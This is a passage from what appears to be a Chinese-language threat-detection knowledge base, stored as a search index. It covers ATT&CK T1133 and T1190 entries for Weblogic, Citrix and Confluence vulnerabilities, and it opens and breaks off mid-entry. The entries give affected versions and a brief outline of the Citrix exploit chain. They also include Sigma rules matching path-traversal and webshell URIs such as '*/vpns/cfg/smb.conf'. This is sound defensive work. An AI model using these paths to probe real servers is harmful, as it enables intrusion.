u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u7684\u8fde\u63a5\u548c\u51ed\u636e\u8eab\u4efd\u9a8c\u8bc1\u3002Windows Remote Management\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u6765\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5728\u7f51\u5185\u7528\u4f5c\u6301\u4e45\u5316\u3002\u901a\u5e38\u9700\u8981\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u624d\u80fd\u4f7f\u7528\u8be5\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7\u51ed\u636e\u7be1\u6539\u6216\u5728\u8fdb\u5165\u4f01\u4e1a\u7f51\u7edc\u4e4b\u540e\u4ece\u7528\u6237\u90a3\u91cc\u83b7\u53d6\u51ed\u636e\u6765\u83b7\u5f97\u6b64\u6743\u9650\u3002\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u5c06\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6309\u7167MITRE\u5b98\u65b9\u793a\u4f8b\uff0c\u50cfVPN\u3001\u8fdc\u7a0b\u684c\u9762\u3001SSH\u7b49\u90fd\u53ef\u4ee5\u5c5e\u4e8eT1133\u5916\u90e8\u8fdc\u7a0b\u8bbf\u95ee\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>SSH\u65e5\u5fd7\u3001VPN\u65e5\u5fd7\u3001\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u6765\u68c0\u6d4b\u653b\u51fb\u8005\u5bf9\u6709\u6548\u5e10\u6237\u7684\u4f7f\u7528\uff0c\u4ee5\u5bf9\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6536\u96c6\u8eab\u4efd\u9a8c\u8bc1\u65e5\u5fd7\u5e76\u5206\u6790\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\uff0c\u6d3b\u52a8\u7a97\u53e3\u4ee5\u53ca\u6b63\u5e38\u5de5\u4f5c\u65f6\u95f4\u4e4b\u5916\u7684\u8bbf\u95ee\u3002</p> <p>\u901a\u8fc7VPN\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6848\u4f8b\uff0c\u4e0d\u5728\u4e00\u4e00\u63cf\u8ff0\u3002\u53ef\u5229\u7528\u7528\u6237\u8d26\u6237\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002\u8fdc\u7a0b\u684c\u9762\u3001SSH\u4e5f\u53ef\u6839\u636e\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1133</p> <p>https://attack.mitre.org/techniques/T1133/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/","title":"T1190-CVE-2018-2894-Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Weblogic\u7ba1\u7406\u7aef\u672a\u6388\u6743\u7684\u4e24\u4e2a\u9875\u9762\u5b58\u5728\u4efb\u610f\u4e0a\u4f20jsp\u6587\u4ef6\u6f0f\u6d1e\uff0c\u8fdb\u800c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002</p> <p>Oracle 7\u6708\u66f4\u65b0\u4e2d\uff0c\u4fee\u590d\u4e86Weblogic Web Service Test Page\u4e2d\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0cWeb Service Test Page \u5728 \u2018\u751f\u4ea7\u6a21\u5f0f\u2019 \u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542f\uff0c\u6240\u4ee5\u8be5\u6f0f\u6d1e\u6709\u4e00\u5b9a\u9650\u5236\u3002\u4e24\u4e2a\u9875\u9762\u5206\u522b\u4e3a/ws_utc/begin.do\u3001/ws_utc/config.do\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a</p> <p>weblogic 10.3.6.0\u3001weblogic 12.1.3.0\u3001weblogic 12.2.1.2\u3001weblogic 12.2.1.3\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a</p> <p>Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09\u590d\u73b0</p> <p>https://blog.csdn.net/weixin_43625577/article/details/97001677</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#sigma","title":"Sigma\u89c4\u5219","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p> <pre><code>title: Oracle WebLogic\u6f0f\u6d1e\u5229\u7528Z\ndescription: \u68c0\u6d4b\u5bf9\u653e\u5165WebLogic\u670d\u52a1\u5668\u4e0a\u5bc6\u94a5\u5e93\u6587\u4ef6\u5939\u4e2d\u7684webshell\u7684\u8bbf\u95ee\nauthor: Florian Roth\ntranslator: 12306Bro\ndate: 2018/07/22\nmodified: 2020/03/14\nstatus: experimental\nreferences:\n    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-2894\n    - https://blog.csdn.net/weixin_43625577/article/details/97001677\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        c-uri:\n            - '*/config/keystore/*.js*'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2018-2894-Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>Weblogic\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09\u590d\u73b0</p> <p>https://blog.csdn.net/weixin_43625577/article/details/97001677</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/","title":"T1190-CVE-2019-19781\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Citrix\u65d7\u4e0b\u591a\u6b3e\u4ea4\u4ed8\u63a7\u5236\u5668\u548c\u7f51\u5173\u5b58\u5728RCE\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u5c31\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u6839\u636e\u5176\u4ed6\u5b89\u5168\u7f51\u7ad9\u7684\u8bf4\u6cd5\uff0c\u8fd9\u4e2aRCE\u6f0f\u6d1e\u4f1a\u6709\u4e00\u4e2a\u6807\u8bb0\u6f0f\u6d1e\uff08\u5176\u4e2d\u4e4b\u4e00\u7684\u6807\u8bb0\uff09\uff0c\u5373\u672c\u6b21\u62a5\u9053\u7684Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CVE-2019-19781\uff09\u3002Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CVE-2019-19781\uff09\u5229\u7528\u65b9\u5f0f\u7684PoC\u5df2\u88ab\u516c\u5f00\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u590d\u6742\u6027\u4f4e\uff0c\u4e14\u65e0\u6743\u9650\u8981\u6c42\uff0c\u653b\u51fb\u8005\u53ea\u80fd\u904d\u5386vpns\u6587\u4ef6\u5939\uff0c\u4f46\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u8fdb\u884cRCE\u6f0f\u6d1e\u8bd5\u63a2\uff0c\u4ece\u800c\u53d1\u8d77\u8fdb\u4e00\u6b65\u7cbe\u51c6\u653b\u51fb\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a</p> <p>Citrix NetScaler ADC and NetScaler Gateway version 10.5</p> <p>Citrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1</p> <p>Citrix ADC and Citrix Gateway version 13.0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff1a</p> <p>1.pl\u6587\u4ef6\u672a\u5bf9NSC_USER\u53c2\u6570\u4f20\u5165\u8fdb\u884c\u8fc7\u6ee4</p> <p>2.\u89e6\u53d1\u76ee\u5f55\u7a7f\u8d8a</p> <p>3.\u5728\u6a21\u677f\u76ee\u5f55\u7684XML\u6587\u4ef6\u5199\u5165\u547d\u4ee4</p> <p>4.\u6a21\u677f\u5f15\u64ce\u5206\u6790\u540e\u6267\u884c\u547d\u4ee4</p> <p>\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a</p> <p>CVE-2019-19781 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0</p> <p>https://www.cnblogs.com/panisme/p/12542721.html</p> <p>Citrix\u8def\u5f84\u904d\u5386\uff08CVE-2019-19781\uff09</p> <p>https://www.jianshu.com/p/03b175711524</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#sigma","title":"Sigma\u89c4\u5219","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p> <pre><code>title: \u68c0\u6d4bCitrix CVE-2019-19781\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\nreferences:\n    - https://www.jianshu.com/p/03b175711524\n    - https://www.jianshu.com/p/03b175711524\nstatus: experimental\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        c-uri: \n            - '*/../vpns/*' #\u6839\u636e\u6b64\u6b21\u516c\u5f00\u7684PoC\u663e\u793a\uff0c\u8be5\u6d1e\u76ee\u5f55\u904d\u5386\u88ab\u9650\u5236\u5b50\u5728vpns\u6587\u4ef6\u5939\u4e0b\uff0c\u4efb\u610f\u7528\u6237\u53ef\u901a\u8fc7HTTP\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002\n            - '*/vpns/cfg/smb.conf' #\u6839\u636e\u6b64\u6b21\u516c\u5f00\u7684PoC\u663e\u793a\uff0c\u8be5\u6d1e\u76ee\u5f55\u904d\u5386\u88ab\u9650\u5236\u5b50\u5728vpns\u6587\u4ef6\u5939\u4e0b\uff0c\u4efb\u610f\u7528\u6237\u53ef\u901a\u8fc7HTTP\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002\n            - '*/vpns/portal/scripts/*.pl*' #\u5229\u7528\u76ee\u5f55\u7a7f\u8d8a\u5199\u5165\u547d\u4ee4\u8bed\u53e5\u5230newbm.pl\u6587\u4ef6\u4e2d\n    condition: selection\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/","title":"T1190-CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Confluence Server\u548cData Center\u5728downloadallattachments\u8d44\u6e90\u4e2d\u5b58\u5728\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u3002 \u5728Page\u6216Blogs\u5177\u6709\u6dfb\u52a0\u9644\u4ef6\u6743\u9650\u7684\u7528\u6237\uff0c\u6216\u5177\u6709\u521b\u5efa\u65b0\u7a7a\u95f4\u6216\u4e2a\u4eba\u7a7a\u95f4\u6743\u9650\u7684\u7528\u6237\uff0c\u6216\u5bf9\u67d0\u7a7a\u95f4\u5177\u6709\u201c\u7ba1\u7406\u5458\u201d\u6743\u9650\u7684\u7528\u6237\u53ef\u5229\u7528\u6b64\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u5c06\u6587\u4ef6\u5199\u5165\u4efb\u610f\u4f4d\u7f6e\u3002\u4e00\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a</p> <p>2.0.0 &lt;= version &lt; 6.6.13</p> <p>6.7.0 